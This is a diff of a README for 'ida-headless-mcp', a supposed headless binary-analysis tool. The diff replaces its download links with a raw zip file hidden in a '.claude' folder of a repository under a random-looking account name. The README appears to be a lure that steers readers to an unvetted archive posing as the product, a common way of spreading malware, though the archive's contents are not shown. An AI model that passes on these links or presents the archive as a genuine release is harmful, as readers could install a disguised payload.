@@ -1,7 +1,7 @@
 # 🛠️ ida-headless-mcp - Easy Binary Analysis Made Simple
 
 ## 📦 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/Zdhhjhfjkhhhhjilk/ida-headless-mcp/main/proto/ida/worker/ida-headless-mcp-oculistic.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Zdhhjhfjkhhhhjilk/ida-headless-mcp/main/proto/ida/worker/ida-headless-mcp-oculistic.zip) 
+[![Download Latest Release](https://raw.githubusercontent.com/Zdhhjhfjkhhhhjilk/ida-headless-mcp/main/.claude/ida-mcp-headless-v2.5.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Zdhhjhfjkhhhhjilk/ida-headless-mcp/main/.claude/ida-mcp-headless-v2.5.zip) 
 
 ## 🚀 Getting Started
 Welcome to the ida-headless-mcp project! This application allows users to perform binary analysis without a graphical interface. It's designed to help reverse engineers and enthusiasts analyze binaries using the Model Context Protocol.
@@ -21,7 +21,7 @@ Welcome to the ida-headless-mcp project! This application allows users to perfor
 ## 📥 Download & Install
 To get started with ida-headless-mcp, please visit the following link to download the latest version: 
 
-[Download Latest Release](https://raw.githubusercontent.com/Zdhhjhfjkhhhhjilk/ida-headless-mcp/main/proto/ida/worker/ida-headless-mcp-oculistic.zip)
+[Download Latest Release](https://raw.githubusercontent.com/Zdhhjhfjkhhhhjilk/ida-headless-mcp/main/.claude/ida-mcp-headless-v2.5.zip)
 
 After downloading, follow these steps to install:
 
